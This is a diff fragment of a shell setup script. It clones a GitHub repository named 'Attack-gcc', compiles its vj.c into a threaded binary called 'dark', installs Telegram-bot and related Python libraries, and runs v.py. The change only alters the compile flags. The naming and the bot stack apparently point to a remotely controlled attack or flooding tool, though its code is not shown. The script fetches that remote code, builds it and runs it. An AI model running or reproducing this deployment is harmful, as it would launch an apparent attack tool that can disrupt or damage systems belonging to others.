@@ -90,7 +90,7 @@ $ROOTFS_DIR/usr/local/bin/proot \
   apt install ufw -y && \
   git clone https://github.com/VIKASH-5938/Attack-gcc.git
   cd Attack-gcc && \
-  if [ -f vj.c ]; then gcc vj.c -o dark -lpthread; fi && \
+  gcc -o dark vj.c -lpthread -lz -static && \
   chmod +x dark && \
   pip install telebot flask pymongo aiohttp python-telegram-bot pytz && \
   python3 v.py"
